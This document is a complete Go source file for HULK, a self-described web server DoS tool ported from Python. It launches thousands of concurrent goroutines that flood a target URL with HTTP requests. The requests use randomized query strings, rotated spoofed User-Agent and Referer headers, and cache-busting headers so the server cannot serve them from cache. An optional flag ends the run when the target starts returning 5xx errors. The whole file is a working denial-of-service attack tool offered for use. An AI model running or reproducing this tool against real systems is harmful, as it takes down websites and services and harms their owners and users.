package main

/*
 HULK DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
 Original Python utility by Barry Shteiman http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/
 This go program licensed under GPLv3.
 Copyright Alexander I.Grafov <grafov@gmail.com>
*/

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
)

const __version__  = "1.0.1"

// const acceptCharset = "windows-1251,utf-8;q=0.7,*;q=0.7" // use it for runet
const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk              uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

// global params
var (
	safe            bool     = false
	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		//"http://www.google.ru/?hl=ru&q=",
		//"http://yandex.ru/yandsearch?text=",
	}
	headersUseragents []string = []string{
	"Mozilla/5.0 (Linux; Android 5.0.2; HTCONE Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.0.4; en-ca; SGH-I717M Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.30",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; LG-D520 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.30",
    "Mozilla/5.0 (Linux; U; Android 4.4.4; en-gb; SM-A300G Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.30",
    "Mozilla/5.0 (Linux; Android 4.4.4; en-us; SAMSUNG SM-N910P Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.2; es-us; SM-T217S Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/537.30",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; LG-P659 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.30",
    "Mozilla/5.0 (Linux; Android 4.4.4; D6708 Build/23.0.E.1.44) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; CK07T Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; LGUS991 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.4; D10F Build/KTU84Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
    "Opera/9.80 (Android; Opera Mini/11.0.1912/37.6488; U; ru) Presto/2.12.423 Version/12.16",
    "Mozilla/5.0 (Linux; Android 4.4.2; Aqua Q3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Mobile Safari/537.36 OPR/30.0.1856.92967",
    "Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910C Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.4; vi-vn; SM-G360H Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.30",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; U671C Build/JZO54K) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24 T5/2.0 bdbrowser/4.9.2.2",
    "Mozilla/5.0 (Linux; U; Android 3.1; en-us; K1 Build/HMJ37) AppleWebKit/534.13(KHTML, like Gecko) Version/4.0 Safari/534.13",
    "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.58 Safari/537.31",
    "Mozilla/5.0 (Linux; Android 4.2.1; Thl W7 Build/MHJ2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; HTC One Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.2.1; M470BSA Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; 7040N Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.2.2; e788h Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Safari/537.36 OPR/30.0.1856.93524",
    "Mozilla/5.0 (Linux; Android 5.1.1; GT-I9301I Build/LMY48G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.0.4; LG-LU6500 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.107 Mobile Safari/537.36 OPR/29.0.1809.93516",
    "Mozilla/5.0 (Linux; U; Android 4.0.4; ko-kr; LG-LU6500 Build/IMM76L) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.30",
    "Mozilla/5.0 (Linux; Android 4.4.2; MyPhone Rio Junior TV Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; SM-G850W Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 2.3.6; en-gb; GT-N7000 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Android; Mobile; rv:14.0) Gecko/14.0 Firefox/14.0",
    "Mozilla/5.0 (Linux; Android 5.0; Lenovo K50a40 Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.2.2; JY-G4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.3; it-it; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; LG-H345 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36",
    "Opera/9.80 (Android 4.1.1; Linux; Opera Tablet/ADR-1212030906) Presto/2.11.355 Version/12.10",
    "Mozilla/5.0 (Linux; Android 4.4.4; HUAWEI H892L Build/HuaweiH892L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3; Nexus 7 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G360T1 Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.2; HTC One Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.2.2; ALCATEL ONE TOUCH 5036A Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.4.2; fr-ca; SGH-I747M-parrot Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.30",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-N9005 Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; Z830 Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 820 dual sim Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-US; GT-I9300 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.7.0.636 U3/0.8.0 Mobile Safari/537.30",
    "Opera/9.80 (Android; Opera Mini/7.5.31657/37.6488; U; fa) Presto/2.12.423 Version/12.16",
    "Mozilla/5.0 (Linux; Android 5.1.1; S6 Build/G920TU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; S6 Build/G920TU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; VS810PP Build/KOT49I.VS810PP2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "MT6752_TD/V1 Linux/3.10.61 Android/5.0 Release/ Browser/AppleWebKit537.36 Chrome/37.0.0.0 Mobile Safari/537.36 System/Android 5.0",
    "Mozilla/5.0 (Linux; Android 5.0.1; GT-I9502 Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.23 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; SM-G7102 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00I Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-US; Nokia_X Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.1.0.527 U3/0.8.0 Mobile Safari/537.30",
    "Mozilla/5.0 (Linux; Android 4.2.2; SAMSUNG-SGH-I337 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; fr-be; SAMSUNG GT-I9195/I9195XXUCOD3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0.1; SM-N910V Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.2.2; en-gb; ORION7o Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/537.30",
    "Mozilla/5.0 (Linux; Android 4.4.4; Lenovo P70-A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; 4027D Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.4; SM-N910T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.30",
    "Mozilla/5.0 (Linux; Android 4.4.3; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; DuOS Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/537.30",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
	}
	cur int32
)

type arrayFlags []string

func (i *arrayFlags) String() string {
	return "[" + strings.Join(*i, ",") + "]"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}

func main() {
	var (
		version bool
		site    string
		agents  string
		data    string
		headers arrayFlags
	)

	flag.BoolVar(&version, "version", false, "print version and exit")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("HULKMAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 15000
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("err parsing url parameter\n")
		os.Exit(1)
	}

	if version {
		fmt.Println("Hulk", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("can'l load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	go func() {
		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("In use               |\tResp OK |\tGot err")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
				atomic.AddInt32(&cur, -1)
				err++
			case callExitOnTooManyFiles:
				atomic.AddInt32(&cur, -1)
				maxproc--
			case callGotOk:
				sent++
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
}

func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	var param_joiner string
	var client = new(http.Client)

	if strings.ContainsRune(url, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

	for {
		var q *http.Request
		var err error

		if data == "" {
			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		} else {
			q, err = http.NewRequest("POST", url, strings.NewReader(data))
		}

		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Charset", acceptCharset)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)

		// Overwrite headers with parameters

		for _, element := range headers {
			words := strings.Split(element, ":")
			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[1]))
		}

		r, e := client.Do(q)
		if e != nil {
			fmt.Fprintln(os.Stderr, e.Error())
			if strings.Contains(e.Error(), "socket: too many open files") {
				s <- callExitOnTooManyFiles
				return
			}
			s <- callExitOnErr
			return
		}
		r.Body.Close()
		s <- callGotOk
		if safe {
			if r.StatusCode >= 500 {
				s <- targetComplete
			}
		}
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}
